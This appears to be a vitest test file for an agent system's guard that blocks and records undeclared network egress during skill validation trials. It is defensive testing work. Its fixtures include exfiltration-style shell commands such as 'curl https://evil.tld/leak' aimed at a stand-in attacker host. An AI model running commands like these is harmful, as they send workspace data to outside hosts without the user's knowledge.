/**
 * PLAN-45 I9: any egress in a validation trial not declared in SKILL.md
 * frontmatter is a REJECT with the host named.
 */
import { describe, expect, it, beforeEach } from "vitest";
import { validateAgainstTasks } from "../../memory/skill-evolution/validate-tasks.js";
import { makeSkillEvolveValidationSessionKey } from "../../sessions/session-key-utils.js";
import {
  checkValidationEgress,
  collectTrialEgress,
  declaredHosts,
  egressHosts,
  hostDeclared,
  registerTrialDeclaredHosts,
  resetValidationEgressForTest,
} from "./validation-egress.js";

const DECLARED = `---
name: weather-lookup
description: Use when the task asks for weather; not for local files.
metadata: { "bitterbot": { "capabilities": { "network": { "outbound": ["api.open-meteo.com", "*.example.org"] } } } }
---
body`;

describe("validation egress (PLAN-45 4.5, I9)", () => {
  beforeEach(() => resetValidationEgressForTest());

  it("reads declared hosts from bitterbot.capabilities.network.outbound; nothing declared = none", () => {
    expect(declaredHosts(DECLARED)).toEqual(["api.open-meteo.com", "*.example.org"]);
    expect(declaredHosts("---\nname: x\ndescription: d\n---\nbody")).toEqual([]);
    expect(hostDeclared("api.open-meteo.com", ["api.open-meteo.com"])).toBe(true);
    expect(hostDeclared("a.example.org", ["*.example.org"])).toBe(true);
    expect(hostDeclared("example.org", ["*.example.org"])).toBe(false);
    expect(hostDeclared("evil.tld", ["*"])).toBe(true);
  });

  it("extracts hosts from URL tools and shell commands before the call", () => {
    expect(egressHosts("web_fetch", { url: "https://api.open-meteo.com/v1?x=1" })).toEqual([
      "api.open-meteo.com",
    ]);
    expect(egressHosts("exec", { command: "curl -sS https://evil.tld/x | jq ." })).toEqual([
      "evil.tld",
    ]);
    expect(egressHosts("exec", { command: "ssh -p 2222 deploy@build.internal.net ls" })).toEqual([
      "build.internal.net",
    ]);
    expect(egressHosts("exec", { command: "wget example.com/file.tgz" })).toEqual(["example.com"]);
    expect(egressHosts("exec", { command: "grep -r foo ." })).toEqual([]);
    expect(egressHosts("read", { path: "https://not-a-url-tool" })).toEqual([]);
    expect(egressHosts("web_search", { query: "x" })).toEqual(["search-provider"]);
  });

  it("blocks undeclared egress in a validation session, records every attempt, and is a no-op elsewhere", () => {
    const key = makeSkillEvolveValidationSessionKey("main", "abc12345");
    registerTrialDeclaredHosts("/trial/ws", declaredHosts(DECLARED));
    const ok = checkValidationEgress({
      toolName: "web_fetch",
      params: { url: "https://api.open-meteo.com/v1" },
      sessionKey: key,
      workspaceDir: "/trial/ws",
    });
    expect(ok.block).toBeNull();
    const bad = checkValidationEgress({
      toolName: "exec",
      params: { command: "curl https://evil.tld/leak" },
      sessionKey: key,
      workspaceDir: "/trial/ws",
    });
    expect(bad.block).toContain('"evil.tld"');
    expect(bad.block).toContain("EGRESS-DENIED");
    // Outside validation sessions: never blocks, never records.
    expect(
      checkValidationEgress({
        toolName: "exec",
        params: { command: "curl https://evil.tld" },
        sessionKey: "agent:main:main",
        workspaceDir: "/trial/ws",
      }).block,
    ).toBeNull();
    const attempts = collectTrialEgress("/trial/ws");
    expect(attempts.map((a) => [a.tool, a.host, a.declared])).toEqual([
      ["web_fetch", "api.open-meteo.com", true],
      ["exec", "evil.tld", false],
    ]);
    // Collected once.
    expect(collectTrialEgress("/trial/ws")).toEqual([]);
  });

  it("the gate statistic cannot mask undeclared egress: candidate-arm egress is a categorical REJECT naming the host; incumbent egress is not charged", async () => {
    const tasks = Array.from({ length: 6 }, (_, i) => ({
      id: `cap-${i}`,
      prompt: `task ${i}. Reply FINAL: <answer>.`,
      checker: { kind: "final" as const, value: "PASS" },
      suite: "capability",
    }));
    const corpus = { tasks, version: "test-v1" };
    const verdict = await validateAgainstTasks({
      corpus,
      trialsPerTask: 1,
      runTask: async (task, variant) => ({
        answer: variant === "candidate" ? "FINAL: PASS" : "FINAL: nope",
        skillRead: variant === "candidate",
        egress:
          task.id === "cap-2" && variant === "candidate"
            ? [{ tool: "exec", host: "evil.tld", declared: false }]
            : variant === "incumbent"
              ? [{ tool: "exec", host: "baseline.example", declared: false }]
              : [],
      }),
    });
    expect(verdict.accepted).toBe(false);
    expect(verdict.reason).toBe("undeclared-egress");
    expect(verdict.undeclaredEgress).toEqual([{ task: "cap-2", tool: "exec", host: "evil.tld" }]);
    // The same run with the host declared is a plain accept.
    const clean = await validateAgainstTasks({
      corpus,
      trialsPerTask: 1,
      runTask: async (_task, variant) => ({
        answer: variant === "candidate" ? "FINAL: PASS" : "FINAL: nope",
        skillRead: variant === "candidate",
        egress: [{ tool: "exec", host: "api.open-meteo.com", declared: true }],
      }),
    });
    expect(clean.reason).toBe("accepted");
  });
});
